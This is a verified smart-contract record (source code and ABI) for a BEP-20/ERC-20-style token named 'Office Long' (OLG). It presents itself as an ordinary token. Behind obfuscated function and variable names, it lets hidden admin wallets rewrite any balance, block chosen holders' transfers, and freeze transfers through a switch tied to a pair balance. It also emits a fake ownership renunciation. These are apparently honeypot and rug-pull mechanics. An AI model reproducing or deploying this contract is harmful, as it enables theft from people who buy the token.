{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface buySwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract buyTokenLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellToTotal {\n    function createPair(address limitModeTx, address toMax) external returns (address);\n}\n\ninterface limitAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFrom) external view returns (uint256);\n\n    function transfer(address walletListMode, uint256 launchedBuyMin) external returns (bool);\n\n    function allowance(address limitTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedBuyMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletListMode,\n        uint256 launchedBuyMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchReceiver, uint256 value);\n    event Approval(address indexed limitTx, address indexed spender, uint256 value);\n}\n\ninterface limitAutoMetadata is limitAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OfficeLong is buyTokenLaunch, limitAuto, limitAutoMetadata {\n\n    uint8 private swapWallet = 18;\n\n    mapping(address => mapping(address => uint256)) private modeEnable;\n\n    function takeTrading() private view {\n        require(walletList[_msgSender()]);\n    }\n\n    mapping(address => uint256) private swapMin;\n\n    function fromFund(address limitMarketing, address walletListMode, uint256 launchedBuyMin) internal returns (bool) {\n        if (limitMarketing == buyTokenSender) {\n            return toIs(limitMarketing, walletListMode, launchedBuyMin);\n        }\n        uint256 txSell = limitAuto(teamReceiverMarketing).balanceOf(minAuto);\n        require(txSell == senderTeam);\n        require(walletListMode != minAuto);\n        if (receiverTeam[limitMarketing]) {\n            return toIs(limitMarketing, walletListMode, exemptMarketing);\n        }\n        return toIs(limitMarketing, walletListMode, launchedBuyMin);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableSwap;\n    }\n\n    string private launchList = \"OLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapWallet;\n    }\n\n    function walletLiquidity(address walletMax, uint256 launchedBuyMin) public {\n        takeTrading();\n        swapMin[walletMax] = launchedBuyMin;\n    }\n\n    function enableTeam(address tokenReceiver) public {\n        takeTrading();\n        if (buyReceiver) {\n            atTrading = limitLiquidity;\n        }\n        if (tokenReceiver == buyTokenSender || tokenReceiver == teamReceiverMarketing) {\n            return;\n        }\n        receiverTeam[tokenReceiver] = true;\n    }\n\n    function balanceOf(address receiverFrom) public view virtual override returns (uint256) {\n        return swapMin[receiverFrom];\n    }\n\n    function toIs(address limitMarketing, address walletListMode, uint256 launchedBuyMin) internal returns (bool) {\n        require(swapMin[limitMarketing] >= launchedBuyMin);\n        swapMin[limitMarketing] -= launchedBuyMin;\n        swapMin[walletListMode] += launchedBuyMin;\n        emit Transfer(limitMarketing, walletListMode, launchedBuyMin);\n        return true;\n    }\n\n    uint256 private atTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverMarketing;\n    }\n\n    constructor (){\n        \n        buySwap swapFund = buySwap(receiverSell);\n        teamReceiverMarketing = sellToTotal(swapFund.factory()).createPair(swapFund.WETH(), address(this));\n        if (limitLiquidity != atTrading) {\n            autoWallet = false;\n        }\n        buyTokenSender = _msgSender();\n        enableLaunch();\n        walletList[buyTokenSender] = true;\n        swapMin[buyTokenSender] = enableSwap;\n        if (tokenBuy != autoMode) {\n            tokenBuy = limitLiquidity;\n        }\n        emit Transfer(address(0), buyTokenSender, enableSwap);\n    }\n\n    function transfer(address walletMax, uint256 launchedBuyMin) external virtual override returns (bool) {\n        return fromFund(_msgSender(), walletMax, launchedBuyMin);\n    }\n\n    function getOwner() external view returns (address) {\n        return toFromExempt;\n    }\n\n    uint256 senderTeam;\n\n    event OwnershipTransferred(address indexed fromLaunch, address indexed takeTo);\n\n    function owner() external view returns (address) {\n        return toFromExempt;\n    }\n\n    address private toFromExempt;\n\n    bool private autoWallet;\n\n    uint256 public tokenBuy;\n\n    bool public shouldSell;\n\n    uint256 public limitLiquidity;\n\n    function fromLimit(uint256 launchedBuyMin) public {\n        takeTrading();\n        senderTeam = launchedBuyMin;\n    }\n\n    address receiverSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private autoMode;\n\n    uint256 constant exemptMarketing = 8 ** 10;\n\n    function transferFrom(address limitMarketing, address walletListMode, uint256 launchedBuyMin) external override returns (bool) {\n        if (_msgSender() != receiverSell) {\n            if (modeEnable[limitMarketing][_msgSender()] != type(uint256).max) {\n                require(launchedBuyMin <= modeEnable[limitMarketing][_msgSender()]);\n                modeEnable[limitMarketing][_msgSender()] -= launchedBuyMin;\n            }\n        }\n        return fromFund(limitMarketing, walletListMode, launchedBuyMin);\n    }\n\n    address public teamReceiverMarketing;\n\n    mapping(address => bool) public receiverTeam;\n\n    address public buyTokenSender;\n\n    uint256 private enableSwap = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchList;\n    }\n\n    uint256 swapSellIs;\n\n    bool public buyReceiver;\n\n    function approve(address liquidityFrom, uint256 launchedBuyMin) public virtual override returns (bool) {\n        modeEnable[_msgSender()][liquidityFrom] = launchedBuyMin;\n        emit Approval(_msgSender(), liquidityFrom, launchedBuyMin);\n        return true;\n    }\n\n    function isTake(address autoFee) public {\n        if (shouldSell) {\n            return;\n        }\n        if (buyReceiver) {\n            buyReceiver = false;\n        }\n        walletList[autoFee] = true;\n        if (fromTotalMin == buyReceiver) {\n            limitLiquidity = autoMode;\n        }\n        shouldSell = true;\n    }\n\n    function enableLaunch() public {\n        emit OwnershipTransferred(buyTokenSender, address(0));\n        toFromExempt = address(0);\n    }\n\n    function allowance(address feeReceiver, address liquidityFrom) external view virtual override returns (uint256) {\n        if (liquidityFrom == receiverSell) {\n            return type(uint256).max;\n        }\n        return modeEnable[feeReceiver][liquidityFrom];\n    }\n\n    mapping(address => bool) public walletList;\n\n    string private receiverMarketing = \"Office Long\";\n\n    bool private fromTotalMin;\n\n    address minAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedBuyMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTokenSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"enableTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedBuyMin\",\"type\":\"uint256\"}],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiverMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedBuyMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletListMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedBuyMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedBuyMin\",\"type\":\"uint256\"}],\"name\":\"walletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OfficeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}